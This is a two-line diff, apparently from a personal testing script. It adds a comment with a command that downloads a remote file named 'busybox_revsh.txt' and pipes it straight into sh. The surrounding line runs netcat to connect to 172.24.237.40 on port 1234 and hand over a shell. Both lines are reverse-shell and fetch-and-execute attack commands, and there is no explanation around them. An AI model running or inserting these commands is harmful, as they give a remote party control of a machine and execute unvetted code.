@@ -1,1 +1,2 @@
+# exec on busybox: wget -O- -q https://raw.githubusercontent.com/kalaxity/memory_exec_test/main/busybox_revsh.txt | sh
 nc 172.24.237.40 1234 -e sh
